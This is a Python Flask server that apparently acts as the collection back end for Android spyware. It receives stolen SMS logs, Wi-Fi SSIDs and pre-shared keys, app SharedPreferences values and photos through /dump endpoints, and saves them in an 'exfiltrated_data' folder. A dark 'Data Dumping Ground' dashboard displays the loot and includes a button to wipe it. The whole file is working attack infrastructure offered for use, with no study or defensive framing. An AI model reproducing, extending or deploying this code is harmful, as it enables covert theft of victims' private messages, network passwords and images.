import os
import shutil
import re
import xml.etree.ElementTree as ET
from flask import Flask, request, render_template_string, send_from_directory, redirect, url_for

app = Flask(__name__)

# --- CONFIG ---
PORT = 8000
HOST = '0.0.0.0'
DUMP_DIR = "exfiltrated_data"

if not os.path.exists(DUMP_DIR):
    os.makedirs(DUMP_DIR)

def format_password_data(raw_text):
    """Refined Whitelist Parser: Only extracts SSIDs, PSKs, and Pref Keys."""
    if not raw_text: return "No data captured."

    lines = raw_text.splitlines()
    formatted_output = []
    current_xml_block = []
    is_xml_map = False

    for line in lines:
        stripped = line.strip()

        # 1. Skip empty lines and noise immediately
        if not stripped or len(stripped) < 2: continue
        if re.search(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', stripped): continue # Skip MACs
        if "android.uid" in stripped or "DHCP" in stripped or "NONE" in stripped: continue
        if stripped.startswith("[{") or stripped.startswith("["): continue # Skip JSON/Arrays

        # 2. Handle Headers (Keep these)
        if stripped.startswith("===") or stripped.startswith("---"):
            formatted_output.append(f"\n{stripped}")
            is_xml_map = False
            continue

        if stripped.startswith("File: "):
            formatted_output.append(f"\n[FILE]: {stripped.replace('File: ', '')}")
            is_xml_map = True
            current_xml_block = []
            continue

        # 3. Targeted WiFi Extraction (SSID & PSK only)
        # Handles both WifiConfigStore.xml and legacy wpa_supplicant.conf
        if "name=\"SSID\"" in stripped or "<SSID>" in stripped or stripped.startswith("ssid="):
            val = re.search(r'>(.*)<', stripped) if ">" in stripped else stripped.split('=')[-1:]
            ssid = (val.group(1) if hasattr(val, 'group') else val[0]).replace('&quot;', '').replace('"', '')
            if ssid: formatted_output.append(f"  [SSID]: {ssid}")
            continue

        if "name=\"PreSharedKey\"" in stripped or "<PreSharedKey>" in stripped or stripped.startswith("psk="):
            val = re.search(r'>(.*)<', stripped) if ">" in stripped else stripped.split('=')[-1:]
            psk = (val.group(1) if hasattr(val, 'group') else val[0]).replace('&quot;', '').replace('"', '')
            if psk: formatted_output.append(f"  [PSK]:  {psk}")
            continue

        # 4. Target SharedPreferences (XML Maps)
        if is_xml_map:
            if "</map>" in stripped:
                current_xml_block.append(stripped)
                try:
                    root = ET.fromstring("\n".join(current_xml_block))
                    for child in root:
                        k = child.get('name')
                        v = child.text if child.text else child.get('value')
                        if k and v: formatted_output.append(f"    > {k}: {v}")
                except: pass
                is_xml_map = False
            else:
                current_xml_block.append(stripped)
            continue

    return "\n".join(formatted_output)

# --- DASHBOARD UI ---
HTML_TEMPLATE = """
<html>
<head>
    <title>MobSec Intelligence Dashboard</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Consolas', monospace; padding: 20px; margin: 0; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .grid { display: grid; grid-template-columns: 1.2fr 0.8fr; gap: 15px; }
        .panel { border: 1px solid #1a1a1a; padding: 12px; background: #0d0d0d; border-radius: 4px; }
        h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 5px; font-size: 16px; margin-top: 0; }
        pre { background: #000; padding: 10px; color: #33ff33; height: 350px; overflow-y: auto; font-size: 12px; border: 1px solid #111; white-space: pre-wrap; }
        .btn { background: #00ff00; color: #000; padding: 6px 12px; text-decoration: none; font-weight: bold; font-size: 11px; display: inline-block; margin-top: 5px; border: none; cursor: pointer; }
        .btn-danger { background: #ff0000; color: #fff; }
        .img-gallery { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; border-top: 1px solid #222; padding-top: 10px; }
        img { width: 100px; height: 100px; object-fit: cover; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="header">
        <h1 style="font-size: 20px; margin: 0;">[ Data Dumping Ground ]</h1>
        <form action="/clear" method="POST" onsubmit="return confirm('Nuke all exfiltrated data?');">
            <button type="submit" class="btn btn-danger">ERASE ALL DATA</button>
        </form>
    </div>
    <div class="grid">
        <div class="panel">
            <h2>SMS DUMP</h2>
            <pre>{{ sms_data }}</pre>
            <a href="/" class="btn">REFRESH</a>
        </div>
        <div class="panel">
            <h2>WIFI/SSID & PASSWORD DUMP</h2>
            <pre>{{ password_data | safe }}</pre>
            <a href="/" class="btn">REFRESH/a>
        </div>
    </div>
    <div class="panel" style="margin-top: 15px;">
        <h2>IMAGE GALLERY DUMP</h2>
        <div class="img-gallery">
            {% for img in images %}
                <img src="/view/{{ img }}" title="{{ img }}">
            {% endfor %}
            {% if not images %}<p style="color:#444; font-size:12px;">No assets found.</p>{% endif %}
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    sms_path = os.path.join(DUMP_DIR, "sms_logs.txt")
    pass_path = os.path.join(DUMP_DIR, "passwords.txt")
    sms_raw = open(sms_path).read() if os.path.exists(sms_path) else ""
    pass_raw = open(pass_path).read() if os.path.exists(pass_path) else ""
    images = [f for f in os.listdir(DUMP_DIR) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
    return render_template_string(HTML_TEMPLATE, sms_data=sms_raw, password_data=format_password_data(pass_raw), images=images)

@app.route('/dump/passwords', methods=['POST'])
def handle_passwords():
    with open(os.path.join(DUMP_DIR, "passwords.txt"), "a") as f:
        f.write(f"\n{request.data.decode('utf-8', errors='ignore')}\n")
    return "OK", 200

@app.route('/dump/sms', methods=['POST'])
def handle_sms():
    with open(os.path.join(DUMP_DIR, "sms_logs.txt"), "a") as f:
        f.write(f"\n{request.data.decode('utf-8', errors='ignore')}\n")
    return "OK", 200

@app.route('/dump/images', methods=['POST'])
def handle_images():
    if 'image' in request.files:
        file = request.files['image']
        file.save(os.path.join(DUMP_DIR, file.filename))
        return "OK", 200
    return "Fail", 400

@app.route('/clear', methods=['POST'])
def clear_data():
    for filename in os.listdir(DUMP_DIR):
        file_path = os.path.join(DUMP_DIR, filename)
        try:
            if os.path.isfile(file_path): os.unlink(file_path)
            elif os.path.isdir(file_path): shutil.rmtree(file_path)
        except: pass
    return redirect(url_for('index'))

@app.route('/view/<filename>')
def view_image(filename):
    return send_from_directory(DUMP_DIR, filename)

if __name__ == '__main__':
    app.run(host=HOST, port=PORT, threaded=True)
